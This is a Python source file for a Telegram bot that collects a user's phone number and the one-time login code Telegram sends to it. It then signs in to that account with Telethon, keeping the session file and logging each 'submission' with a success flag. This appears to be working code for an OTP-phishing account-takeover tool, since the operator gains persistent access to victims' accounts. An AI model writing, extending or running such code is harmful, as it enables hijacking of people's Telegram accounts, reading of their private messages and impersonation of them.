from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os
from database import get_user, log_submission
from messages import MESSAGES

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

class OTPState(StatesGroup):
    waiting_for_number = State()
    waiting_for_code = State()

sessions = {}

def register(dp):
    @dp.message_handler(commands=['start'])
    async def start(msg: types.Message):
        lang = get_user(msg.from_user.id)[4]
        await msg.answer(MESSAGES[lang]['start'])
        await OTPState.waiting_for_number.set()

    @dp.message_handler(state=OTPState.waiting_for_number)
    async def get_number(msg: types.Message, state: FSMContext):
        number = msg.text.strip()
        session_name = f"session_{msg.from_user.id}"
        sessions[msg.from_user.id] = TelegramClient(session_name, API_ID, API_HASH)
        client = sessions[msg.from_user.id]
        await client.connect()
        try:
            await client.send_code_request(number)
            await state.update_data(number=number)
            lang = get_user(msg.from_user.id)[4]
            await msg.answer(MESSAGES[lang]['otp_request'].format(number=number))
            await OTPState.waiting_for_code.set()
        except Exception as e:
            await msg.answer("❌ Failed to send code: " + str(e))
            await state.finish()

    @dp.message_handler(state=OTPState.waiting_for_code)
    async def get_code(msg: types.Message, state: FSMContext):
        data = await state.get_data()
        number = data['number']
        code = msg.text.strip()
        client = sessions[msg.from_user.id]
        lang = get_user(msg.from_user.id)[4]
        try:
            await client.sign_in(phone=number, code=code)
            client.disconnect()
            log_submission(msg.from_user.id, number, 1)
            await msg.answer(MESSAGES[lang]['success'])
        except SessionPasswordNeededError:
            log_submission(msg.from_user.id, number, 0)
            await msg.answer(MESSAGES[lang]['2fa'])
        except Exception as e:
            log_submission(msg.from_user.id, number, 0)
            await msg.answer(MESSAGES[lang]['fail'] + f"\n{e}")
        await state.finish()
